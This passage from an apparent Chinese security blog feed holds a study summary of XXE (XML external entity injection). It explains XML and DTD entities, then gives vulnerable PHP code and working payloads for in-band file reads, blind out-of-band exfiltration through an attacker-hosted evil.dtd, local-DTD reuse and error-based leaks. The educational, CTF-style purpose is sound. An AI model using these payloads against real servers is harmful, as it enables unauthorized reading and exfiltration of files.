优化安装逻辑等<br>V1.3：移除python，新增golang和java<br>V2.1：增加CTF-Misc部分工具的安装<br>V2.2：优化可重复运行脚本逻辑</p><h1 id="后续计划"><a href="#后续计划" class="headerlink" title="后续计划"></a>后续计划</h1><p>1：计划增加web系列工具</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;auto-deploy&quot;&gt;&lt;a href=&quot;#auto-deploy&quot; class=&quot;headerlink&quot; title=&quot;auto_deploy&quot;&gt;&lt;/a&gt;auto_deploy&lt;/h1&gt;&lt;p&gt;一个自动部署Misc工具的&lt;del&gt;轻量&lt;/del&gt;sh脚本&lt;br&gt;</summary>
      
    
    
    
    <category term="脚本" scheme="https://www.lewiserii.top/categories/%E8%84%9A%E6%9C%AC/"/>
    
    
    <category term="misc" scheme="https://www.lewiserii.top/tags/misc/"/>
    
    <category term="sh" scheme="https://www.lewiserii.top/tags/sh/"/>
    
    <category term="脚本" scheme="https://www.lewiserii.top/tags/%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>xxe学习总结</title>
    <link href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/xxe%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html"/>
    <id>https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/xxe%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html</id>
    <published>2023-02-15T04:00:00.000Z</published>
    <updated>2023-02-15T05:17:03.064Z</updated>
    
    <content type="html"><![CDATA[<h1 id="从XML到XXE"><a href="#从XML到XXE" class="headerlink" title="从XML到XXE"></a>从XML到XXE</h1><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p><strong>什么是 XML？</strong><br>XML 指可扩展标记语言（EXtensible Markup Language）。<br>XML 的设计宗旨是传输数据，而不是显示数据。<br>XML 是 W3C 的推荐标准。<br>XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。<br>XML 语言没有预定义的标签。</p><p><strong>XML 和 HTML 之间的差异</strong><br>XML 不是 HTML 的替代。<br>XML 和 HTML 为不同的目的而设计：</p><blockquote><p>XML 被设计用来传输和存储数据，其焦点是数据的内容。<br>HTML 被设计用来显示数据，其焦点是数据的外观。<br>HTML 旨在显示信息，而 XML 旨在传输信息。</p></blockquote><p>XML文档结构包括<code>XML声明</code>、<code>DTD文档类型定义（可选）</code>、<code>文档元素</code>。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--XML申明--&gt;</span><br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><br><span class="hljs-comment">&lt;!--文档类型定义--&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [  &lt;!--定义此文档是 note 类型的文档--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">note</span> (<span class="hljs-keyword">to</span>,<span class="hljs-keyword">from</span>,<span class="hljs-keyword">heading</span>,<span class="hljs-keyword">body</span>)&gt;</span>  &lt;!--定义note元素有四个元素--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">to</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">from</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">head</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">body</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-comment">&lt;!--文档元素--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Dave<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>Tom<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>You are a good man<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><p>DTD(文档类型定义，Document Type Definition )的作用是定义<code>XML</code>文档的合法构建模块。它使用一系列的合法元素来定义文档结构。</p><h3 id="DTD引用方式"><a href="#DTD引用方式" class="headerlink" title="DTD引用方式"></a>DTD引用方式</h3><p>1）DTD 内部声明<br><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p><p>2）DTD 外部引用<br><code>&lt;!DOCTYPE 根元素名称 SYSTEM &quot;外部DTD的URI&quot;&gt;</code></p><p>3）引用公共DTD<br><code>&lt;!DOCTYPE 根元素名称 PUBLIC &quot;DTD标识名&quot; &quot;公用DTD的URI&quot;&gt;</code></p><h3 id="DTD-关键字"><a href="#DTD-关键字" class="headerlink" title="DTD 关键字"></a>DTD 关键字</h3><ul><li>DOCTYPE（DTD的声明）</li><li>ENTITY（实体的声明）</li><li>SYSTEM、PUBLIC（外部资源申请）</li><li>ELEMENT（定义元素声明）</li></ul><h2 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h2><p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。<br>实体按类型主要分为以下四种：</p><ul><li>内置实体 (Built-in entities)</li><li>字符实体 (Character entities)</li><li>通用实体&#x2F;普通实体 (General entities)</li><li>参数实体 (Parameter entities)</li></ul><p><strong>内置实体</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">&amp;符号: &amp;amp;<br>单引号: &amp;apos;<br>＞: &amp;gt;<br>＜: &amp;lt;<br>双引号: &amp;quot;<br></code></pre></td></tr></table></figure><p><strong>字符实体</strong></p><p>通常是<code>html</code>的实体编码，例如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version = <span class="hljs-string">&quot;1.0&quot;</span> encoding = <span class="hljs-string">&quot;UTF-8&quot;</span> standalone = <span class="hljs-string">&quot;yes&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">author</span>[</span><br><span class="hljs-meta">   <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">author</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta">   <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">copyright</span> <span class="hljs-string">&quot;&amp;#169;&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span><span class="hljs-symbol">&amp;writer;</span><span class="hljs-symbol">&amp;copyright;</span><span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>&amp;#169</code>即<code>©</code></p><p><strong>普通实体</strong></p><p>例如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version = <span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta">   <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">source-text</span> <span class="hljs-string">&quot;tutorialspoint&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br>   &amp;source-text;<br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>参数实体</strong></p><p>例如</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">ename</span> <span class="hljs-string">&quot;entity_value&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>参数实体必须先定义再使用，而不能像一般实体那样随意放置。</p><h3 id="内部实体与外部实体"><a href="#内部实体与外部实体" class="headerlink" title="内部实体与外部实体"></a>内部实体与外部实体</h3><p>实体根据引用方式，还可分为内部实体与外部实体。</p><p>内部实体：<br><code>&lt;!ENTITY entity_name &quot;entity_value&quot;&gt;</code></p><p>外部实体：<br><code>&lt;!ENTITY name SYSTEM &quot;URI/URL&quot;&gt;</code></p><h3 id="通用实体和参数实体"><a href="#通用实体和参数实体" class="headerlink" title="通用实体和参数实体"></a>通用实体和参数实体</h3><p>其实按照使用来分类，又可以将实体分为通用实体和参数实体。</p><p>通用实体：<br>用<code>&amp;实体名;</code>引用的实体，他在<code>DTD</code>中定义，在<code>XML</code>文档中引用</p><p>参数实体：<br>使用<code>% 实体名</code>在<code>DTD</code>中定义，并且只能在<code>DTD</code>中使用<code>%实体名;</code>引用<br>只有在<code>DTD</code>文件中，参数实体的声明才能引用其他实体<br>和通用实体一样，参数实体也可以外部引用</p><h3 id="不同程序支持的协议"><a href="#不同程序支持的协议" class="headerlink" title="不同程序支持的协议"></a>不同程序支持的协议</h3><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-4.png"></p><blockquote><p>1.其中从2012年9月开始，Oracle JDK版本中删除了对gopher方案的支持，后来又支持的版本是 Oracle JDK 1.7 update 7 和 Oracle JDK 1.6 update 35<br>2.libxml 是 PHP 的 xml 支持</p></blockquote><p>PHP支持的协议会更多一些，但需要一定的扩展：</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-9.png"></p><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>XXE漏洞全称<code>XML External Entity Injection</code>即XML外部实体注入。<br>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。</p><h1 id="XXE的几种利用方式"><a href="#XXE的几种利用方式" class="headerlink" title="XXE的几种利用方式"></a>XXE的几种利用方式</h1><h2 id="有回显任意文件读取-Normal-Based-XXE"><a href="#有回显任意文件读取-Normal-Based-XXE" class="headerlink" title="有回显任意文件读取(Normal Based XXE)"></a>有回显任意文件读取(Normal Based XXE)</h2><p>服务能接收并解析 XML 格式的输入并且有回显的时候，我们就能输入我们自定义的 XML 代码，通过引用外部实体的方法，引用服务器上面的文件</p><p>xxe.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>); <span class="hljs-comment">//获取客户端输入内容</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();    <span class="hljs-comment">//初始化XML解析器</span><br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); <span class="hljs-comment">//加载客户端输入的XML内容</span><br>    <span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);  <span class="hljs-comment">//获取XML文档节点，如果成功则返回SimpleXMLElement对象，如果失败则返回FALSE</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$creds</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span> ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-1.png"></p><h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><p>如果读取的文件中包含特殊符号，比如<code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、<code>&quot;</code>、<code>&#39;</code>等，就会返回一些报错信息</p><p>这时可以使用<code>CDATA</code>或者<code>base64 convert</code></p><p>术语<code>CDATA</code>指的是不应由<code>XML解析器</code>进行解析的文本数据<code>（Unparsed Character Data）</code><br><code>CDATA</code>部分由<code>&quot;&lt;![CDATA[&quot;</code>开始，由<code>&quot;]]&gt;&quot;</code>结束，解析器会忽略<code>CDATA</code>部分中的所有内容</p><p>我们的思路就是把读取的文件放在CDATA中之后再调用</p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span></span><br><span class="hljs-meta">[<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">start</span></span></span><br><span class="hljs-meta"><span class="hljs-meta"><span class="hljs-string">&quot;&lt;![CDATA[&lt;!ENTITY % xxe SYSTEM &quot;</span>file:///flag<span class="hljs-string">&quot;&gt; ]]&gt;&quot;</span></span></span><br><span class="hljs-meta"><span class="hljs-meta">&gt;</span>]</span><br><span class="hljs-meta">% <span class="hljs-keyword">xxe</span>;&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span>&amp;start<span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></td></tr></table></figure><p>不过使用这个payload读文件时还是会报错，因为在<code>xml</code>中，<code>xml</code>解析器有个限制：不能在内部<code>Entity</code>中引用，<code>“PEReferences forbidden in internal subset in Entity ”</code>指的就是禁止内部参数实体引用</p><p>所以需要调用的外部的<code>dtd</code></p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">start</span> <span class="hljs-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">go</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">end</span> <span class="hljs-string">&quot;]]&gt;&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://vps/evil.dtd&quot;</span>&gt;</span>%dtd;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;all;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">all</span> <span class="hljs-string">&quot;%start;%go;%end;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-2.png"></p><h2 id="无回显任意文件读取-Blind-Based-XXE"><a href="#无回显任意文件读取-Blind-Based-XXE" class="headerlink" title="无回显任意文件读取(Blind Based XXE)"></a>无回显任意文件读取(Blind Based XXE)</h2><p>xxe.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="出网"><a href="#出网" class="headerlink" title="出网"></a>出网</h3><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">convert</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://vps/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%remote;%int;%send;</span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">int</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://vps:port?a=%file;&#x27;&gt;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>vps上监听对应的端口</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-3.png"></p><p>先调用了<code>%remote</code>，请求远程服务器上的<code>evil.dtd</code>，类似php的<code>include</code>，然后<code>%int</code>调用<code>%file</code>，<code>%file</code>获取敏感文件后将结果填入到<code>%send</code>，最后调用<code>%send</code>把我们的读取到的数据发送到我们的远程服务器上，这样就实现了外带数据的效果，要注意实体的值中不能有<code>%</code>, 所以将其转成html实体编码</p><h3 id="不出网"><a href="#不出网" class="headerlink" title="不出网"></a>不出网</h3><p>以上都是引入外部服务器的<code>OOB XXE（Out-of-band）</code>，虽然好用，但是有一个软肋。当服务器配置好防火墙，禁止服务器请求外网dtd文件的话，就无法接受到数据了。</p><p>这时候就可以考虑利用本地dtd来进行XXE</p><p>linux</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">local_dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">ISOamsa</span> <span class="hljs-string">&#x27;Your DTD code&#x27;</span>&gt;</span><br>%local_dtd;<br></code></pre></td></tr></table></figure><p>windows</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">local_dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file://C:/Windows/System32/wbem/xml/cim20.dtd&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">SuperClass</span> <span class="hljs-string">&#x27;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&#x27;</span>&gt;</span><br>%local_dtd;<br></code></pre></td></tr></table></figure><p>引用内部实体payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;/usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">ISOamso</span> <span class="hljs-string">&#x27;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;http://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;eval;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;send;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">    &#x27;</span>&gt;</span></span><br><span class="hljs-meta">    %remote;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>1234<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="基于报错的XXE-Error-Based-XXE"><a href="#基于报错的XXE-Error-Based-XXE" class="headerlink" title="基于报错的XXE(Error Based XXE)"></a>基于报错的XXE(Error Based XXE)</h2><p>基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。</p><p>出网payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;https://vps/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %remote;</span><br><span class="hljs-meta">    %error;</span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">start</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#37; error SYSTEM &#x27;file:///fakefile/%file;&#x27;&gt;&quot;</span>&gt;</span><br>%start;<br></code></pre></td></tr></table></figure><p>不出网如果可以写文件的话就可以构造本地恶意dtd</p><p>不出网payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">local_dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///tmp/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">condition</span> <span class="hljs-string">&#x27;aaa)&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;</span></span></span><br><span 